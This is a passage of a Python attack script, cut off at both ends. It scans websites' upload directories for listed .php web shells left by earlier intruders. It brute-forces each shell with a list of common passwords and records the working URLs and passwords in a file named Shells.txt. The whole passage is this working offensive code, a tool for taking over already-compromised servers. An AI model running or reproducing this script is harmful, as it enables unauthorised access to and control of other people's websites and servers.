											if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH5_O+shell+'.php'+'#t00r')
											else :
												p123 = requests.post(SH5_O+shell+'.php',data=password_123,timeout=15).content
												if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH5_O+shell+'.php'+'#123')
												else :
													p1234 = requests.post(SH5_O+shell+'.php',data=password_1234,timeout=15).content
													if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH5_O+shell+'.php'+'#1234')
													else :
														p12345 = requests.post(SH5_O+shell+'.php',data=password_12345,timeout=15).content
														if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH5_O+shell+'.php'+'#12345')
														else :
															p123456 = requests.post(SH5_O+shell+'.php',data=password_123456,timeout=15).content
															if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH5_O+shell+'.php'+'#123456')
															else :
																p123123 = requests.post(SH5_O+shell+'.php',data=password_123123,timeout=15).content
																if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH5_O+shell+'.php'+'#123123')
																else :
																	p123321 = requests.post(SH5_O+shell+'.php',data=password_123321,timeout=15).content
																	if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH5_O+shell+'.php'+'#123321')
																	else :
																		p123456789 = requests.post(SH5_O+shell+'.php',data=password_123456789,timeout=15).content
																		if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH5_O+shell+'.php'+'#123456789')
																		else :
																			p1234567890 = requests.post(SH5_O+shell+'.php',data=password_1234567890,timeout=15).content
																			if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH5_O+shell+'.php'+'#1234567890')
																			else :
																				phaurgeulis = requests.post(SH5_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																				if 'Andela1C3' in phaurgeulis  :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH5_O+shell+'.php'+'#haurgeulis')
																				else :
																					print(' # '+site +' --> {}[Failed]'.format(fr))
						else :
							print(' # '+site +' --> {}[Failed]'.format(fr))
				else :
					uploads_check = requests.get(SH6_O,timeout=15).content
					if 'Index of' in uploads_check and '.php' in uploads_check :
						shells = []
						if re.findall(pattern_php,uploads_check):
							shells = re.findall(pattern_php,uploads_check)			
						for shell in shells:
							sh_check = requests.get(SH6_O+shell+'.php',timeout=15).content
							if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH6_O+shell+'.php')
							elif ' name=pass' in sh_check :
								nhzgrf = requests.post(SH6_O+shell+'.php',data=password_nhzgrf,timeout=15).content
								if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH6_O+shell+'.php'+'#nhzgrf')
								else :
									proot = requests.post(SH6_O+shell+'.php',data=password_root,timeout=15).content
									if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH6_O+shell+'.php'+'#root')
									else :
										pr00t = requests.post(SH6_O+shell+'.php',data=password_r00t,timeout=15).content
										if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH6_O+shell+'.php'+'#r00t')
										else :
											padmin = requests.post(SH6_O+shell+'.php',data=password_admin,timeout=15).content
											if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH6_O+shell+'.php'+'#admin')
											else :
												pt00r = requests.post(SH6_O+shell+'.php',data=password_t00r,timeout=15).content
												if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH6_O+shell+'.php'+'#t00r')
												else :
													p123 = requests.post(SH6_O+shell+'.php',data=password_123,timeout=15).content
													if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH6_O+shell+'.php'+'#123')
													else :
														p1234 = requests.post(SH6_O+shell+'.php',data=password_1234,timeout=15).content
														if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH6_O+shell+'.php'+'#1234')
														else :
															p12345 = requests.post(SH6_O+shell+'.php',data=password_12345,timeout=15).content
															if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH6_O+shell+'.php'+'#12345')
															else :
																p123456 = requests.post(SH6_O+shell+'.php',data=password_123456,timeout=15).content
																if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH6_O+shell+'.php'+'#123456')
																else :
																	p123123 = requests.post(SH6_O+shell+'.php',data=password_123123,timeout=15).content
																	if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH6_O+shell+'.php'+'#123123')
																	else :
																		p123321 = requests.post(SH6_O+shell+'.php',data=password_123321,timeout=15).content
																		if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH6_O+shell+'.php'+'#123321')
																		else :
																			p123456789 = requests.post(SH6_O+shell+'.php',data=password_123456789,timeout=15).content
																			if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH6_O+shell+'.php'+'#123456789')
																			else :
																				p1234567890 = requests.post(SH6_O+shell+'.php',data=password_1234567890,timeout=15).content
																				if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH6_O+shell+'.php'+'#1234567890')
																				else :
																					phaurgeulis = requests.post(SH6_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																					if 'Andela1C3' in phaurgeulis  :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH6_O+shell+'.php'+'#haurgeulis')
																					else :
																						print(' # '+site +' --> {}[Failed]'.format(fr))
							else :
								print(' # '+site +' --> {}[Failed]'.format(fr))
					else :
						img_check = requests.get(SH7_O,timeout=15).content
						if 'Index of' in img_check and '.php' in img_check :
							shells = []
							if re.findall(pattern_php,img_check):
								shells = re.findall(pattern_php,img_check)			
							for shell in shells:
								sh_check = requests.get(SH7_O+shell+'.php',timeout=15).content
								if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH7_O+shell+'.php')
								elif ' name=pass' in sh_check :
									nhzgrf = requests.post(SH7_O+shell+'.php',data=password_nhzgrf,timeout=15).content
									if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH7_O+shell+'.php'+'#nhzgrf')
									else :
										proot = requests.post(SH7_O+shell+'.php',data=password_root,timeout=15).content
										if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH7_O+shell+'.php'+'#root')
										else :
											pr00t = requests.post(SH7_O+shell+'.php',data=password_r00t,timeout=15).content
											if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH7_O+shell+'.php'+'#r00t')
											else :
												padmin = requests.post(SH7_O+shell+'.php',data=password_admin,timeout=15).content
												if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH7_O+shell+'.php'+'#admin')
												else :
													pt00r = requests.post(SH7_O+shell+'.php',data=password_t00r,timeout=15).content
													if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH7_O+shell+'.php'+'#t00r')
													else :
														p123 = requests.post(SH7_O+shell+'.php',data=password_123,timeout=15).content
														if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH7_O+shell+'.php'+'#123')
														else :
															p1234 = requests.post(SH7_O+shell+'.php',data=password_1234,timeout=15).content
															if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH7_O+shell+'.php'+'#1234')
															else :
																p12345 = requests.post(SH7_O+shell+'.php',data=password_12345,timeout=15).content
																if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH7_O+shell+'.php'+'#12345')
																else :
																	p123456 = requests.post(SH7_O+shell+'.php',data=password_123456,timeout=15).content
																	if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH7_O+shell+'.php'+'#123456')
																	else :
																		p123123 = requests.post(SH7_O+shell+'.php',data=password_123123,timeout=15).content
																		if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH7_O+shell+'.php'+'#123123')
																		else :
																			p123321 = requests.post(SH7_O+shell+'.php',data=password_123321,timeout=15).content
																			if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH7_O+shell+'.php'+'#123321')
																			else :
																				p123456789 = requests.post(SH7_O+shell+'.php',data=password_123456789,timeout=15).content
																				if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH7_O+shell+'.php'+'#123456789')
																				else :
																					p1234567890 = requests.post(SH7_O+shell+'.php',data=password_1234567890,timeout=15).content
																					if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH7_O+shell+'.php'+'#1234567890')
																					else :
																						phaurgeulis = requests.post(SH7_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																						if 'Andela1C3' in phaurgeulis  :
																							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH7_O+shell+'.php'+'#haurgeulis')
																						else :
																							print(' # '+site +' --> {}[Failed]'.format(fr))
								else :
									print(' # '+site +' --> {}[Failed]'.format(fr))
						else :
							upload_check = requests.get(SH8_O,timeout=15).content
							if 'Index of' in upload_check and '.php' in upload_check :
								shells = []
								if re.findall(pattern_php,upload_check):
									shells = re.findall(pattern_php,upload_check)			
								for shell in shells:
									sh_check = requests.get(SH8_O+shell+'.php',timeout=15).content
									if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH8_O+shell+'.php')
									elif ' name=pass' in sh_check :
										nhzgrf = requests.post(SH8_O+shell+'.php',data=password_nhzgrf,timeout=15).content
										if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH8_O+shell+'.php'+'#nhzgrf')
										else :
											proot = requests.post(SH8_O+shell+'.php',data=password_root,timeout=15).content
											if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH8_O+shell+'.php'+'#root')
											else :
												pr00t = requests.post(SH8_O+shell+'.php',data=password_r00t,timeout=15).content
												if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH8_O+shell+'.php'+'#r00t')
												else :
													padmin = requests.post(SH8_O+shell+'.php',data=password_admin,timeout=15).content
													if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH8_O+shell+'.php'+'#admin')
													else :
														pt00r = requests.post(SH8_O+shell+'.php',data=password_t00r,timeout=15).content
														if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH8_O+shell+'.php'+'#t00r')
														else :
															p123 = requests.post(SH8_O+shell+'.php',data=password_123,timeout=15).content
															if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH8_O+shell+'.php'+'#123')
															else :
																p1234 = requests.post(SH8_O+shell+'.php',data=password_1234,timeout=15).content
																if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH8_O+shell+'.php'+'#1234')
																else :
																	p12345 = requests.post(SH8_O+shell+'.php',data=password_12345,timeout=15).content
																	if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH8_O+shell+'.php'+'#12345')
																	else :
																		p123456 = requests.post(SH8_O+shell+'.php',data=password_123456,timeout=15).content
																		if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH8_O+shell+'.php'+'#123456')
																		else :
																			p123123 = requests.post(SH8_O+shell+'.php',data=password_123123,timeout=15).content
																			if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
